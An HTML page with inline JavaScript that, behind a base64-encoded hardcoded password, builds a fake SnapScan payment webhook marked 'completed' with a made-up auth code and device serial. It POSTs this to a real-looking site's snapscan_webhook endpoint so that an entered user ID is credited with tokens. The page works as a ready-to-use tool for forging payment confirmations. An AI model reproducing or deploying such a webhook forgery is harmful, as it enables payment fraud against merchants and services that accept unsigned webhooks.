<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⧉</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #222;
            color: #fff;
        }

        main {
            text-align: center;
            width: 60%;
            background-color: #333;
            padding: 20px;
            border-radius: 10px;
        }

        label {
            display: block;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
            margin-bottom: 16px;
            background-color: #444;
            color: #fff;
            border: none;
            border-radius: 5px;
        }

        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <main>
        <h1>⧉</h1>

        <label for="password">Enter Password:</label>
        <input type="password" id="password" placeholder="Enter Password">

        <label for="userID">USER ID:</label>
        <input type="text" id="userID" placeholder="ENTER USER ID">

        <label for="tokens">TOKENS:</label>
        <input type="text" id="tokens" placeholder="UPDATE AMOUNT">

        <button onclick="checkAndSendRequest()">UPDATE</button>
    </main>

    <script>
        const obfuscatedPassword = "YWxsdGhhdGdsaXR0ZXJz";

        function deobfuscate(str) {
            return atob(str);
        }

        function checkAndSendRequest() {
            const enteredPassword = document.getElementById('password').value;

            if (enteredPassword === deobfuscate(obfuscatedPassword)) {
                sendPostRequest();
            } else {
                alert("Incorrect password. Access denied.");
            }
        }

        function sendPostRequest() {
            const userID = document.getElementById('userID').value;
            const tokens = document.getElementById('tokens').value;

            console.log('tokens:', tokens);

const jsonData = {
    "id": tokens,
        "status": "completed",
        "date": "1999-12-31T23:00:00Z",
        "totalAmount": 1000,
        "tipAmount": 0,
        "requiredAmount": 1000,
        "snapCode": "STB115",
        "snapCodeReference": "Till Point #1",
        "userReference": "John Doe",
        "merchantReference": "INV001",
        "statementReference": "SNAPSCAN 20150109",
        "authCode": "123456",
        "isVoucher": false,
        "isVoucherRedemption": false,
        "extra": {
          "customValue": userID
        },
        "deviceSerialNumber": "R28K10HBQTX",
        "transactionType": "payment"
      };

            fetch('https://frame-archive.online/snapscan_webhook', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(jsonData)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
